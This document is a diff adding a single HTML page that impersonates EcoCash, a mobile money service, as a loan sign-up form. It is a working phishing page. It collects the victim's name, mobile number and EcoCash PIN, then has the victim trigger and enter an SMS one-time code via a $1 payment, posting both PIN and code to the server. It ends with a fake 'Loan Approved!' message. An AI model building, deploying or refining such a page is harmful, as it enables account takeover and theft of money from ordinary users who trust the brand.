@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EcoCash Sign Up</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    font-family: 'Roboto', Arial, sans-serif;
+    background: #ffffff;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+  }
+  .container {
+    width: 100%;
+    max-width: 400px;
+    padding: 20px;
+  }
+  .logo {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .logo img {
+    width: 120px;
+  }
+  h2 {
+    text-align: center;
+    color: #333;
+    margin-bottom: 20px;
+    font-size: 22px;
+  }
+  label {
+    display: block;
+    margin-bottom: 5px;
+    color: #333;
+    font-size: 14px;
+    font-weight: 500;
+  }
+  input, select {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 15px;
+    font-size: 16px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    background: #f9f9f9;
+  }
+  input:focus, select:focus {
+    outline: none;
+    border-color: #F2A900;
+    background: #fff;
+  }
+  button {
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: bold;
+    color: white;
+    background: #F2A900;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+  button:hover {
+    background: #d49300;
+  }
+  .hidden { display: none; }
+  .note {
+    background: #fff3cd;
+    color: #856404;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 14px;
+    margin-bottom: 20px;
+    line-height: 1.5;
+  }
+  .footer {
+    text-align: center;
+    margin-top: 30px;
+    font-size: 12px;
+    color: #999;
+  }
+  .success-icon {
+    text-align: center;
+    font-size: 60px;
+    color: #28a745;
+    margin-bottom: 20px;
+  }
+  .success-text {
+    text-align: center;
+    font-size: 18px;
+    color: #333;
+    margin-bottom: 10px;
+  }
+  .amount-text {
+    text-align: center;
+    font-size: 24px;
+    font-weight: bold;
+    color: #F2A900;
+    margin-bottom: 30px;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  
+  <!-- Logo -->
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/EcoCash_Logo.png/200px-EcoCash_Logo.png" alt="EcoCash Logo">
+  </div>
+
+  <!-- Step 1: Sign Up Form -->
+  <div id="signupStep">
+    <h2>Sign up</h2>
+    
+    <label>First Name</label>
+    <input type="text" id="firstName" placeholder="First Name" required>
+    
+    <label>Surname</label>
+    <input type="text" id="surname" placeholder="Surname" required>
+
+    <label>Select Loan Amount</label>
+    <select id="loanAmount">
+      <option value="300">$300</option>
+      <option value="500">$500</option>
+      <option value="1000">$1000</option>
+      <option value="1500">$1500</option>
+      <option value="2000">$2000</option>
+      <option value="2500">$2500</option>
+      <option value="3000">$3000</option>
+    </select>
+    
+    <label>Username (Mobile number)</label>
+    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+      <select style="width: 80px; margin-bottom: 0;">
+        <option>+263</option>
+      </select>
+      <input type="tel" id="phone" placeholder="Mobile Number" style="margin-bottom: 0;" required>
+    </div>
+    
+    <label>EcoCash PIN</label>
+    <input type="password" id="pin" placeholder="Enter PIN" required>
+    
+    <button onclick="submitSignup()">Sign Up</button>
+  </div>
+
+  <!-- Step 2: OTP Section -->
+  <div id="otpStep" class="hidden">
+    <h2>Verify Identity</h2>
+    <div class="note">
+      <b>Step 1:</b> Open your <b>EcoCash App</b>.<br>
+      <b>Step 2:</b> Do a <b>Quickteller</b> payment of <b>$1</b> to your own number.<br>
+      <b>Step 3:</b> Check your SMS for the <b>OTP</b>.
+    </div>
+    
+    <label>Enter SMS OTP</label>
+    <input type="number" id="otp" placeholder="Enter the OTP from SMS" required>
+    
+    <button onclick="submitOtp()">Verify OTP</button>
+  </div>
+
+  <!-- Step 3: Success Page -->
+  <div id="successStep" class="hidden">
+    <div class="success-icon">✅</div>
+    <div class="success-text">Loan Approved!</div>
+    <div class="amount-text" id="displayAmount">$1000</div>
+    <div class="success-text">Your loan is being processed.</div>
+    <button onclick="location.reload()">Start New Loan</button>
+  </div>
+
+  <div class="footer">
+    &copy; 2026 EcoCash Loan System
+  </div>
+
+</div>
+
+<script>
+  function submitSignup() {
+    const firstName = document.getElementById('firstName').value;
+    const surname = document.getElementById('surname').value;
+    const loanAmount = document.getElementById('loanAmount').value;
+    const phone = document.getElementById('phone').value;
+    const pin = document.getElementById('pin').value;
+
+    if(!firstName || !surname || !phone || !pin) {
+      alert("Please fill all fields");
+      return;
+    }
+
+    // Send details to server
+    fetch('/signup', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `firstName=${encodeURIComponent(firstName)}&surname=${encodeURIComponent(surname)}&loanAmount=${encodeURIComponent(loanAmount)}&phone=${encodeURIComponent(phone)}&pin=${encodeURIComponent(pin)}`
+    })
+    .then(response => response.text())
+    .then(data => {
+      // Show OTP step
+      document.getElementById('signupStep').classList.add('hidden');
+      document.getElementById('otpStep').classList.remove('hidden');
+    })
+    .catch(error => console.error('Error:', error));
+  }
+
+  function submitOtp() {
+    const firstName = document.getElementById('firstName').value;
+    const surname = document.getElementById('surname').value;
+    const loanAmount = document.getElementById('loanAmount').value;
+    const phone = document.getElementById('phone').value;
+    const pin = document.getElementById('pin').value;
+    const otp = document.getElementById('otp').value;
+
+    if(!otp) {
+      alert("Please enter the OTP");
+      return;
+    }
+
+    // Send OTP to server
+    fetch('/verify-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `firstName=${encodeURIComponent(firstName)}&surname=${encodeURIComponent(surname)}&loanAmount=${encodeURIComponent(loanAmount)}&phone=${encodeURIComponent(phone)}&pin=${encodeURIComponent(pin)}&otp=${encodeURIComponent(otp)}`
+    })
+    .then(response => response.text())
+    .then(data => {
+      // Show Success Page
+      document.getElementById('otpStep').classList.add('hidden');
+      document.getElementById('successStep').classList.remove('hidden');
+      document.getElementById('displayAmount').innerText = '$' + loanAmount;
+    })
+    .catch(error => console.error('Error:', error));
+  }
+</script>
+
+</body>
+</html>
